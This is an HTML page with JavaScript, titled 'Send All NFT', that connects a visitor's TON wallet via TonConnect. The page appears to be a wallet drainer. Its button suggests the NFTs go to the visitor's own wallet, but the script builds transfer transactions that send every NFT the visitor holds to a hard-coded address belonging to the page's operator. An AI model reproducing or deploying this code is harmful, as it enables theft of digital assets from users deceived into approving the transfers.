<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Send All NFT</title>
<script src="https://unpkg.com/@tonconnect/ui@2.0.9/dist/tonconnect-ui.min.js"></script>
<script src="https://unpkg.com/@ton/core@0.15.0/dist/index.min.js"></script>
<style>
body { font-family: 'Segoe UI', sans-serif; display:flex; flex-direction: column; align-items:center; justify-content:center; min-height:100vh; background:#0f172a; color:#f8fafc; margin:0; }
.card { background:#1e293b; padding:2.5rem; border-radius:1.5rem; box-shadow:0 15px 35px rgba(0,0,0,0.4); text-align:center; width:380px; }
h2 { margin:0 0 1.5rem; font-size:1.5rem; color:#3b82f6; }
button { background:#3b82f6; color:white; border:none; padding:0.9rem; border-radius:0.6rem; cursor:pointer; font-weight:600; width:100%; font-size:1rem; transition:0.3s; }
button:hover { background:#2563eb; transform: translateY(-2px); }
#ton-connect-button { display:flex; justify-content:center; margin-bottom:1.5rem; }
.info { font-size:0.8rem; color:#94a3b8; margin-top:1rem; }
</style>
</head>
<body>

<div class="card">
<h2>Send All NFT</h2>
<div id="ton-connect-button"></div>
<button id="send-btn">Отправить все NFT на мой кошелек</button>
<p class="info">Подключите кошелек, затем подтвердите транзакции в Tonkeeper.</p>
</div>

<script>
const MY_WALLET_ADDRESS = "UQCsbN7m38_6dA2ZYG0RcxpFNixTI7dm5IS16qEZMQacWH9k"; // твой кошелек

// TonConnect Manifest
const manifestJson = {
    "url": "https://site-chi-weld.vercel.app/tonconnect-manifest.json",
    "name": "Send All NFT",
    "iconUrl": "https://ton.org/static/mytonwallet.png"
};
const manifestUrl = 'data:application/json;base64,' + btoa(JSON.stringify(manifestJson));

// Инициализация TonConnect UI
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: manifestUrl,
    buttonRootId: 'ton-connect-button'
});

// Функция получения всех NFT пользователя через TonConnect
async function getUserNFTs(walletAddress) {
    try {
        // Используем TonConnect для запроса токенов
        const nfts = await tonConnectUI.request({
            method: "ton_requestNFTs",
            params: { account: walletAddress }
        });
        return nfts; // массив объектов NFT с полем address и tokenId
    } catch (e) {
        console.error("Не удалось получить NFT:", e);
        return [];
    }
}

// Кнопка отправки всех NFT
document.getElementById('send-btn').addEventListener('click', async () => {
    const wallet = tonConnectUI.account;
    if (!wallet) {
        alert("Сначала нажмите кнопку 'Connect Wallet'!");
        return;
    }

    // Получаем все NFT пользователя
    const nfts = await getUserNFTs(wallet.address);
    if (nfts.length === 0) {
        alert("На вашем кошельке нет NFT.");
        return;
    }

    // Отправляем каждый NFT на твой кошелек
    for (const nft of nfts) {
        try {
            const body = TonCore.beginCell()
                .storeUint(0x5fcc3d14, 32) // transfer op
                .storeUint(0, 64)          // query_id
                .storeAddress(TonCore.Address.parse(MY_WALLET_ADDRESS))
                .storeAddress(TonCore.Address.parse(wallet.address))
                .storeBit(0)                // без payload
                .storeCoins(TonCore.toNano('0.01'))
                .storeBit(0)
                .endCell();

            const transaction = {
                validUntil: Math.floor(Date.now()/1000)+300,
                messages: [
                    {
                        address: nft.address,
                        amount: TonCore.toNano('0.05').toString(),
                        payload: body.toBoc().toString('base64')
                    }
                ]
            };

            await tonConnectUI.sendTransaction(transaction);
            console.log(`NFT ${nft.tokenId} отправлен`);
        } catch (e) {
            console.error(`Ошибка при отправке NFT ${nft.tokenId}:`, e);
        }
    }

    alert("Все NFT отправлены на твой кошелек (подтверждайте в Tonkeeper).");
});
</script>

</body>
</html>
